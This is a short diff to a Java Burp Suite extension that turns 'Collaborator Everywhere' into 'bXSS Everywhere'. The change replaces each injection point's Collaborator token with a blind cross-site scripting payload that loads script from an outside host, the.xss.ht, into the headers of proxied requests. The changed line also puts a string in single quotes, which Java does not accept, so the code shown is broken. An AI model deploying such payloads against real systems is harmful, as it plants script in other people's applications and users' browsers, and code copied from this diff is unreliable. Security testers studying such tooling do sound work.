@@ -6,8 +6,8 @@ import java.text.SimpleDateFormat;
 import java.util.*;
 
 public class BurpExtender implements IBurpExtender {
-    private static final String name = "Collaborator Everywhere";
-    private static final String version = "1.3";
+    private static final String name = "bXSS Everywhere";
+    private static final String version = ".1";
 
     // provides potentially useful info but increases memory usage
     static final boolean SAVE_RESPONSES = false;
@@ -264,7 +264,10 @@ class Injector implements IProxyListener {
         request = Utilities.addOrReplaceHeader(request, "Cache-Control", "no-transform");
 
         for (String[] injection: injectionPoints) {
-            String payload = injection[2].replace("%s", collab.generateCollabId(requestCode, injection[1]));
+	    // bXSS payload adjustment
+	    String payload = injection[2].replace("%s", '"><script src=https://the.xss.ht></script>');
+            // ORIGINAL String payload in the line below
+	    // String payload = injection[2].replace("%s", collab.generateCollabId(requestCode, injection[1]));
 	    // replace %h with corresponding Host header (same as with %s for Collaborator)
 	    payload = payload.replace("%h", Utilities.getHeader(request, "Host"));
             switch ( injection[0] ){
